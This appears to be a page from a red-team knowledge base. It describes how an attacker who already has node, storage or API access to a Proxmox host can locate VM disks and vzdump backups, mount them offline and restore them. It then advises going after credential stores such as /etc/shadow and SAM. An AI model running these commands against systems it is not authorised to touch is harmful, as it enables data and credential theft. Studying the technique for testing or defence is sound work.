---
title: "Disk and backup theft: taking Proxmox VM disks and vzdump archives"
order: 4
description: "Proxmox stores VM disks on configurable backends (local qcow2/raw, LVM, ZFS, Ceph) and backups as vzdump archives. With node, storage, or API access, an attacker reads the disks offline with the usual tools or restores and mounts a vzdump backup, extracting any VM's or container's data without entering it."
keywords:
  - vzdump
  - qcow2
  - lvm
  - ceph
  - proxmox backup
---

# Disk and backup theft

Proxmox stores VM disks on whichever backend a storage is configured for: local directory storage holds qcow2 or raw files, LVM-thin holds logical volumes, and ZFS or Ceph hold their own volumes. Backups are vzdump archives on a backup storage or a Proxmox Backup Server. Access to any of these, the node filesystem, the storage backend, or the API, lets an attacker read a VM's or container's disk offline, or restore and mount a backup, extracting the guest data with no login and no in-guest defenses.

## Locate and read disks

```bash
# where disks live depends on the storage type
cat /etc/pve/storage.cfg                   # storage backends and paths
qm config <vmid> | grep -E 'scsi|virtio|ide'   # which volume backs the VM
# local file storage
ls -l /var/lib/vz/images/<vmid>/
guestmount -a /var/lib/vz/images/<vmid>/vm-<vmid>-disk-0.qcow2 -i --ro /mnt/guest
# LVM-thin: activate and mount the logical volume
lvs; lvchange -ay <vg>/vm-<vmid>-disk-0; guestmount -a /dev/<vg>/vm-<vmid>-disk-0 -i --ro /mnt
# ZFS: the zvol under /dev/zvol; Ceph: map the RBD image
```

## Backups

```bash
# vzdump archives (lzo/zst/gz) on backup storage
ls -l /var/lib/vz/dump/*.vma.* /var/lib/vz/dump/*.tar.*
# restore to a scratch VM/container, or extract a VMA archive to read its disks
qmrestore /var/lib/vz/dump/vzdump-qemu-<vmid>-*.vma.zst 9999   # restore to id 9999
# or extract the VMA to raw disks and mount offline
```

## Exploitation notes

- The read method follows the storage type: `guestmount`/`qemu-nbd` for file and block volumes, `lvchange -ay` then mount for LVM-thin, the zvol device for ZFS, and `rbd map` for Ceph; `storage.cfg` and `qm config` tell you which applies.
- vzdump backups are a complete, portable copy of a guest; restoring one to a throwaway id or extracting the VMA archive reads the disk without touching the original VM.
- Offline mounting bypasses all guest controls; prioritise credential stores (SAM/SYSTEM, `/etc/shadow`, keys) as with any disk theft.
- This chains from node, storage, or API access; see [Host access and shell](host-access-and-shell.md) and the [Management plane](management-plane.md) for obtaining it.

## Tools

- [libguestfs / guestmount](https://libguestfs.org/)

## References

- [Proxmox VE: storage](https://pve.proxmox.com/pve-docs/chapter-pvesm.html)
- [Proxmox VE: backup and restore (vzdump)](https://pve.proxmox.com/pve-docs/chapter-vzdump.html)
